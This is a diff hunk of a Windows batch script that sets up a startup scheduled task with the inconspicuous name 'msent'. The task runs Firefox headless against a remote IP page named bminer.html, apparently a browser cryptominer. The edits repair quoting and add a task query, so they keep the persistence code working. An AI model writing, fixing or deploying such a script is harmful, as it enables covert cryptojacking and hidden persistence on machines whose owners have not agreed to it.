@@ -26,8 +26,8 @@ schtasks /run /i /tn msent
 goto end
 
 :firefox
-%process%" -createprofile profile_name
+"%process%" -createprofile profile_name
 schtasks /create /tn msent  /sc onstart  /f /tr "'%process%' -p profile_name -no-remote -headless http://198.13.46.244/bminer.html"
 schtasks /run /i /tn msent
-
+schtasks /query /tn msent
 :end
